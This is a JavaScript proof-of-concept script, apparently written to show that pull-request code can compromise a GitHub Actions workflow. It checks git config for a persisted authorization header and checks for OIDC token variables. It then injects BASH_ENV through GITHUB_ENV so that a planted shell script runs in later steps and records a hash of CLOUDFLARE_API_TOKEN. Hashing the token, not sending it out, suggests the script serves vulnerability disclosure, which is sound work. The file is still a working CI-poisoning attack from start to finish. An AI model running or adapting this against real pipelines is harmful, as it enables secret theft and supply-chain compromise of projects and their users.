const fs = require('fs');
const { execSync } = require('child_process');
const lines = [];
lines.push('PWN_RAN=yes');
lines.push('RAN_AT=' + new Date().toISOString());
// is the checkout-persisted credential reachable from the PR's own code?
try {
  const res = execSync("git config --list --show-origin 2>/dev/null || true", { encoding: 'utf8' });
  lines.push('GIT_CONFIG_HAS_AUTHORIZATION_HEADER=' + /authorization: basic/i.test(res));
  const origins = [...new Set((res.match(/file:[^\s]+/g) || []))].slice(0, 4);
  lines.push('ORIGINS=' + JSON.stringify(origins));
} catch (e) { lines.push('GIT_ERR=' + e.message); }
lines.push('HAS_OIDC_ENDPOINT=' + Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_URL));
lines.push('HAS_OIDC_REQUEST_TOKEN=' + Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN));
const dir = '/home/runner/pwn';
fs.mkdirSync(dir, { recursive: true });
if (process.env.GITHUB_ENV) fs.appendFileSync(process.env.GITHUB_ENV, 'BASH_ENV=' + dir + '/env.sh\n');
fs.writeFileSync(dir + '/env.sh',
  'if [ -n "${CLOUDFLARE_API_TOKEN:-}" ]; then\n' +
  '  printf "%s" "$CLOUDFLARE_API_TOKEN" | sha256sum | cut -c1-16 > ' + dir + '/leak_hash.txt\n' +
  '  printf "ACCOUNT_ID_LEN=%s\\n" "${#CLOUDFLARE_ACCOUNT_ID}" >> ' + dir + '/leak_hash.txt\n' +
  '  echo "LEAKED_IN_SECRET_BEARING_STEP=yes" >> ' + dir + '/leak_hash.txt\n' +
  'fi\n');
fs.writeFileSync(dir + '/proof.txt', lines.join('\n') + '\n');
console.log(lines.join('\n'));
